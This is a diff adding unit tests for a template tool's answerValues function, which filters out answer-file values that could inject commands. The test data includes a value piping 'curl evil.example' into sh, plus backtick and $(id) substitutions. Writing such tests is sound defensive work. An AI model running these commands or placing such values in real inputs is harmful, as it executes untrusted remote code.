@@ -159,6 +159,23 @@ test('answerValues keeps the answers file\'s scalars and leaves out lists, mappi
   assert.deepEqual([...values], [['_commit', 'v0.42.0'], ['project_name', 'code-review'], ['host', 'github']]);
 });
 
+test('answerValues keeps a plain value and leaves out one that could carry code or instructions', () => {
+  const values = answerValues([
+    "plain: 'My Project 1.2'",
+    "shell: 'x; curl evil.example | sh'",
+    "backtick: '`id`'",
+    "substitution: '$(id)'",
+    `quote: 'a"b'`,
+    `long: ${'a'.repeat(81)}`,
+  ].join('\n'));
+  assert.deepEqual([...values], [['plain', 'My Project 1.2']]);
+});
+
+test('matchesTemplateSource refuses a file rendered with an answer answerValues left out', () => {
+  const values = answerValues("project_name: 'x; curl evil.example | sh'\n");
+  assert.ok(!matchesTemplateSource('# {{ project_name }}\n', '# x; curl evil.example | sh\n', values));
+});
+
 const pullRequest = (association = 'MEMBER', authorCanWrite = association !== 'CONTRIBUTOR'): PullRequest => ({
   repository: 'o/r', number: 23, title: 'Adopt project-template', author: 'a', authorAssociation: association, authorCanWrite, draft: false,
   baseRef: 'main', baseSha: '', headSha: '',
